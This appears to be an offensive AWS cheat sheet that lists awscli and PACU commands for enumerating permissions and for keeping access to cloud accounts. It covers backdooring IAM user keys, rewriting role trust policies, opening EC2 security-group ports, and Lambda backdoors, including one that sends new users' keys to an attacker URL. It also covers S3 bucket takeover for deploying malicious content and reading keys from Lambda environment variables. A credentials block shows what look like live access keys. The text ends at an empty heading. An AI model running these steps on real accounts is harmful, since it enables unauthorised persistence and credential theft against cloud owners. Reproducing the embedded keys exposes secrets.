## General
### Access key and Secret key:
```
aws configure
aws configure --profile Test
aws sts get-caller-identity --profile Test
```

### PACU
```
import_keys Test
ls
whoami
run iam__enum_permissions
run aws__enum_spend
```

## Maintain persistence
### Identify user with 0 or 1 access key (need iam:CreateAccessKey)
```
aws iam list-users --profile Test
aws iam list-access-keys --user-name Sarah --profile Test
aws iam create-access-key --user-name Sarah --profile Test
# Or run PACU command
run iam__backdoor_users_keys
```

### User with iam update-assume-role-policy
Identify non-service-link role
```
aws iam a list-roles --profile Test
```
Change the trust-policy
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com",
        "AWS": "arn:aws:iam::593820606366:user/vitquay-nonroot"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```
Update and assume role
```
aws iam update-assume-role-policy --role-name test-role --policy-document file://trust-policy.json --profile Test
aws sts assume-role --role-arn arn:aws:iam::748384263101:role/test-role --role-session-name PersistenceTest --profile vitquaynonroot
# Or just use PACU
run iam__backdoor_assume_role --role-names Admin --user-arns arn:aws:iam::012345678912:root
```
Change .aws/credentials file
```
[PersistenceTest2]
aws_access_key_id = ASIA24PZNTO6525L54XY
aws_secret_access_key = SVbH0B5VKQU9VHUJKSKfqdZZcIThAOfkOgjyH3Cm
aws_session_token = <SHORTENED>
```

### Allow port in EC2
```
aws ec2 describe-instances --profile Test
aws ec2 describe-security-groups --group-ids sg-0315cp741b51fr4d0 --profile Test
aws ec2 authorize-security-group-ingress --group-id sg-0315cp741b51fr4d0 --protocol tcp --port 27017-27018 --cidr 1.1.1.1/32
# Or using PACU
run ec2__backdoor_ec2_sec_groups --ip 1.1.1.1/32 --port-range 27017-27018 --protocol tcp --groups corp@us-west-2
```

### Lambda to send user keys when created
```
run lambda__backdoor_new_users --exfil-url http://attacker-server.com/
run lambda__backdoor_new_users --cleanup
run lambda__backdoor_new_sec_groups
run lambda__backdoor_new_roles
```

## EC2
10.0.1.1 is reserved for the gateway of the subnet, 10.0.1.2 is
reserved for AWS DNS, and 10.0.1.3 is reserved for any future use by
AWS.

Look for hardcoded user data
```
run ec2__enum
run ec2__download_userdata
```
## S3
### awscli commands
```
aws s3 ls s3://kirit-bucket
aws s3 cp abc.txt s3://kirit-bucket/new/abc.txt
aws s3 rm s3://kirit-bucket/new/abc.txt --acl public-read
```

### NoSuchBucket message
- Check CNAME record for the bucket name
- Create S3 bucket with the same name and region
- Deploy malicious content

## Lambda
### Read/Run permission:Exploit function to exfil data
Check function, environment variable
```
aws lambda list-functions --profile LambdaReadOnlyTester
aws lambda get-function --function-name VulnerableFunction --profile LambdaReadOnlyTester  
```
Check Event
```
aws lambda list-event-source-mappings --function-name VulnerableFunction --profile LambdaReadOnlyTester
aws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester
```
The keys are in the environment variable
Tips: If you have "lambda:InvokeFunction" you can trigger custom event and specify the exact payload.

### Read&Write Permission: Privesc

